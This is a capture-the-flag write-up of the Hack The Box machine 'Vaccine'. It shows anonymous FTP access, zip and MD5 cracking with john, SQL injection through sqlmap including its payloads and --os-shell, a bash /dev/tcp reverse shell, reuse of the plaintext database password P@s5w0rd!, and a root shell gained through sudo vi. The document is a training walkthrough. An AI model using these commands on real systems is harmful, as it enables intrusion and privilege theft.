# Vaccine
#HTB #very-easy #ftp #sql-injection #reverse-shell #privilege-escalation #Web #password-cracking #sudo #networks-services #databases #authentication #john
## Target:
*Name:* Vaccine

*IP:* 10.129.130.190
## Vulnerability:
- Anonymous FTP access exposed sensitive web application files.
- Weak password protection allowed john the Ripper to recover the password.
- Hardcoded credentials and weak password hashing.
- SQL injection vulnerability allowed remote command execution leading to reverse shell.
- Credentials reuse allowed access to target machine.
- Misconfigured `sudo` privileges lead to privilege escalation.

## Steps:
#### 1) Reconnaissance
Using nmap, we identified open ports and the services running on each one.

**Code:**
```
nmap -sV 10.129.130.190
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-31 05:15 -0400
Nmap scan report for 10.129.130.190
Host is up (0.047s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds   
```
#### 2) Investigating the ftp server
**Code:**
```
ftp -a 10.129.130.190
```
**Result:**
```
Connected to 10.129.130.190.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
The server allows anonymous login to the FTP service. We can now get the files stored by that service.

**Full process:**
```
ftp> ls
229 Entering Extended Passive Mode (|||10687|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.

ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10751|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |******************************************************************************************************************************************************|  2533      121.90 KiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (66.96 KiB/s)
```
Then, we'll unzip the file locally using `unzip`:
**Code:**
```
unzip backup.zip
```
**Result:**
```
Archive:  backup.zip
[backup.zip] index.php password: 
```
The archive requires a password to unzip it.
#### 3) Cracking the zip file's password
`John the ripper` toolset comes with a script (`zip2john`) that generates a hash from a password protected zip archive, This allows us to perform password cracking attacks against the extracted hash.
**Code:**
```
zip2john backup.zip > psswd.txt
```
**psswd.txt:**
```
┌──(_____________)-[~]
└─$ cat psswd.txt              
backup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip
```
Now we can try to crack the password using `john`:
**Code:**
```
john psswd.txt
```
**Result:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
741852963        (backup.zip)     
1g 0:00:00:00 DONE 2/3 (2026-07-31 05:54) 5.000g/s 363645p/s 363645c/s 363645C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
**Password found:** `741852963`

After that, we'll re-unzip the file:
```
┌──(___________)-[~]
└─$ unzip backup.zip               
Archive:  backup.zip
[backup.zip] index.php password:  (Entered 741852963)
  inflating: index.php               
  inflating: style.css 
```
#### 4) Examining the unzipped files
While inspecting `index.php` file, we found a line that contains hard coded the MD5 hash of the admin password account:
```
if($_POST['username'] === 'admin' && md5($_POST['password']) === "<MD5_PASSWORD>") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
```
#### 5) Cracking the `admin`'s password using john
We'll use `john the ripper` again to recover the password.
**Code:**
```
echo "<MD5_PASSWORD>" > adminhash.txt
john adminhash.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
```
**Result:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD>        (?)     
1g 0:00:00:00 DONE (2026-07-31 06:06) 25.00g/s 2505Kp/s 2505Kc/s 2505KC/s roslin..pogimo
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```
**Password:** `<PASSWORD>`
#### 6) Log in to the web application
Now we have admin account credentials, we can log in to the web application:

> [!NOTE]
>We firstly tried sql injection on the login page but it didn't work.
<img width="2559" height="1346" alt="image" src="https://github.com/user-attachments/assets/d5da5f17-798b-409b-88b8-fd3dfaf859c2" />
<img width="2559" height="1368" alt="image" src="https://github.com/user-attachments/assets/499a8229-aba0-4965-8430-fa7b36c9691d" />

By checking the URL, we can see that the `search` GET parameter is used by the application to filter car entries. We could test it to see if it's SQL injectable, but instead of doing it manually, we will use a tool called sqlmap .
<img width="367" height="39" alt="image" src="https://github.com/user-attachments/assets/131db867-6d60-44ea-a614-1140050bee57" />
#### 7) Using sqlmap
**Code:**
```
sqlmap -u 'http://10.129.130.190/dashboard.php?search=cars' --cookie="PHPSESSID=q7vu2lfif080an4itrg3ebgi8m"
```
**Result:**
```
        ___
       __H__                                                
 ___ ___[.]_____ ___ ___  {1.10.6#stable}                                          
|_ -| . [']     | .'| . |      
|___|_  ["]_|_|_|__,|  _|      
      |_|V...       |_|   https://sqlmap.org                                                                                  
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:33:26 /2026-07-31/

[06:33:27] [INFO] testing connection to the target URL
[06:33:27] [INFO] checking if the target is protected by some kind of WAF/IPS
[06:33:27] [INFO] testing if the target URL content is stable
[06:33:27] [INFO] target URL content is stable
[06:33:27] [INFO] testing if GET parameter 'search' is dynamic
[06:33:27] [WARNING] GET parameter 'search' does not appear to be dynamic
[06:33:27] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
[06:33:27] [INFO] heuristic (XSS) test shows that GET parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
[06:33:27] [INFO] testing for SQL injection on GET parameter 'search'
[06:33:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[06:33:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[06:33:28] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[06:33:28] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[06:33:28] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[06:33:28] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[06:33:28] [INFO] testing 'Generic inline queries'
[06:33:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[06:33:38] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] y
[06:33:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[06:33:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[06:33:54] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[06:33:54] [WARNING] reflective value(s) found and filtering out
[06:33:54] [INFO] target URL appears to have 5 columns in query
[06:33:54] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
---
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=cars';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=cars' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(98)||CHR(122)||CHR(98)||CHR(113))||(CHR(100)||CHR(68)||CHR(72)||CHR(76)||CHR(87)||CHR(118)||CHR(112)||CHR(106)||CHR(89)||CHR(102)||CHR(110)||CHR(71)||CHR(81)||CHR(85)||CHR(66)||CHR(81)||CHR(118)||CHR(86)||CHR(78)||CHR(65)||CHR(99)||CHR(70)||CHR(107)||CHR(77)||CHR(111)||CHR(108)||CHR(119)||CHR(114)||CHR(70)||CHR(120)||CHR(97)||CHR(83)||CHR(107)||CHR(118)||CHR(113)||CHR(90)||CHR(67)||CHR(87)||CHR(79)||CHR(113))||(CHR(113)||CHR(98)||CHR(98)||CHR(98)||CHR(113))-- jqOX
---
[06:34:01] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[06:34:01] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.130.190'

[*] ending @ 06:34:01 /2026-07-31/
```
`sqlmap` identified the `search` parameter as vulnerable to sql injection:
```
GET parameter 'search' is vulnerable.
```
#### 8) Command injection
We will run the sqlmap once more, where we are going to provide the `--os-shell` flag, where we will be able to perform command injection:
**Code:**
```
sqlmap -u 'http://10.129.130.190/dashboard.php?search=cars' --cookie="PHPSESSID=q7vu2lfif080an4itrg3ebgi8m" --os-shell
```
This gave us the shell we can execute commands with. However, this shell is not interactive (commands like cd don't work), we can use a command to perform reverse shell:
```
bash -c "bash -i >& /dev/tcp/10.10.15.37/443 0>&1"
```
> [!NOTE]
> 10.10.15.37 is the attacker's ip.

But firstly, we need to open a listener on port `443` using netcat:
```
nc -nlvp 443
```

**Reverse Shell succeeded:**
```
postgres@vaccine:/var/lib/postgresql/11/main$ 
```
For full interactive shell (allows to enter password for example for sudo):
```
postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<in$ python3 -c 'import pty; pty.spawn("/bin/bash")'
postgres@vaccine:/var/lib/postgresql/11/main$ ^Z (ctrl+Z)
zsh: suspended  nc -nvlp 443
┌──(___________)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -nvlp 443

postgres@vaccine:/var/lib/postgresql/11/main$
```
This fixes terminal behavior and allows interactive shell features such as Ctrl+C and password prompts.
#### 9) Searching for the flags
**Full proccess:**
```
postgres@vaccine:/var/lib/postgresql/11/main$ ls
ls
base
global
pg_commit_ts
pg_dynshmem
pg_logical
pg_multixact
pg_notify
pg_replslot
pg_serial
pg_snapshots
pg_stat
pg_stat_tmp
pg_subtrans
pg_tblspc
pg_twophase
PG_VERSION
pg_wal
pg_xact
postgresql.auto.conf
postmaster.opts
postmaster.pid

postgres@vaccine:/var/lib/postgresql/11/main$ cd ..
cd ..

postgres@vaccine:/var/lib/postgresql/11$ ls
ls
main

postgres@vaccine:/var/lib/postgresql/11$ cd ..
cd ..

postgres@vaccine:/var/lib/postgresql$ ls
ls
11
user.txt

postgres@vaccine:/var/lib/postgresql$ cat user.txt
cat user.txt
<USER_FLAG>
```
We found `User` flag, we still need `Root` flag. This indicates that we have to perform privilege escalation.

> [!NOTE]
> **Second method**
> We could also use `bash -c` option to get the flag directly without an interactive shell using the command `bash -c "cd .. && cd .. && ls && cat user.txt"`. This requires to try multiple commands (changing directories and listing them) before finding the exact place of user.txt. 

```
postgres@vaccine:/$ ls
bin    etc             lib     lost+found  proc  snap  usr
boot   home            lib32   media       root  srv   var
cdrom  initrd.img      lib64   mnt         run   sys   vmlinuz
dev    initrd.img.old  libx32  opt         sbin  tmp   vmlinuz.old
postgres@vaccine:/$ cd root
bash: cd: root: Permission denied
```
We need the sudo password to access root directory.
After searching, we found PostgreSQL database credentials in `dashboard.php`:
```
try {
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
        }
```
The credentials used the `postgres` database account with the password `P@s5w0rd!`. The password was reused for the Linux `postgres` user.
The interactive reverse shell keeps disconnecting from the server and we have to redo the full process over and over. Instead of that we can use SSH directly since we have now the password of postgres user:
**Code:**
```
ssh postgres@10.129.130.190
```
We'll now check privileges that postgres user have using `sudo -l` command:
```
postgres@vaccine:/$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

The user can run the `vi` editor on the `pg_hba.conf` file with root privileges. Since `vi` can execute a shell, the user can spawn a root shell and escalate their privileges.
**Commands on vi editor:**
*Set which shell vi should use*
```
:set shell=/bin/sh
```
*Open the shell*
```
:shell
```

Now we got shell running as the root user:
```
# whoami
root
```
We can access root directory and search for the flag:
**Full process:**
```
# ls
bin  boot  cdrom  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
# cd root
# ls
pg_hba.conf  root.txt  snap
# cat root.txt 
<ROOT_FLAG>
```
## Flag: 
[Not disclosed — solve it yourself!]
## Key takeaway:
- Public services can contain sensitive information.
- Predictable passwords can be recovered easily using password cracking tools.
- Web applications often store database connection credentials in their source code. If these credentials are exposed and reused on the system, they may allow access to other accounts.
- Misconfigured sudo permissions can allow low-privileged users to execute privileged programs and escalate their privileges.
